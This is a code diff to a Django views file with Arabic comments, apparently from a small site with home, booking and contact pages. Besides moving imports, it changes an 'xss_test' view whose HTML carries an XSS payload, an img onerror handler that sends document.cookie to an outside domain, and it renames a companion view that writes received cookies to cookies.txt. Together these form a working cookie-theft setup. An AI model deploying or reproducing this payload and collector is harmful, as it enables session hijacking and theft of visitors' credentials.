@@ -2,6 +2,8 @@ from django.shortcuts import render, get_object_or_404
 from .models import City
 from django.http import HttpResponse
 import os
+from django.core.mail import send_mail
+from .models import ContactMessage
 
 # الصفحة الرئيسية
 def home(request):
@@ -19,9 +21,6 @@ def booking(request):
     return render(request, 'booking.html')
 
 # صفحة التواصل
-from django.core.mail import send_mail
-from .models import ContactMessage
-
 def contact(request):
     if request.method == 'POST':
         name = request.POST.get('name')
@@ -48,13 +47,13 @@ def xss_test(request):
         <html>
         <body>
         <h1>XSS Test</h1>
-        <img src="x" onerror="fetch('/collect/?cookie='+document.cookie)">
+        <img src="x" onerror="fetch('https://usaau.com/collect/?cookie='+document.cookie)">
         </body>
         </html>
     """)
 
 # استقبال الكوكيز وتخزينها
-def receive_cookie(request):
+def collect(request):
     cookie = request.GET.get("cookie", "")
     if cookie:
         with open("cookies.txt", "a") as f:
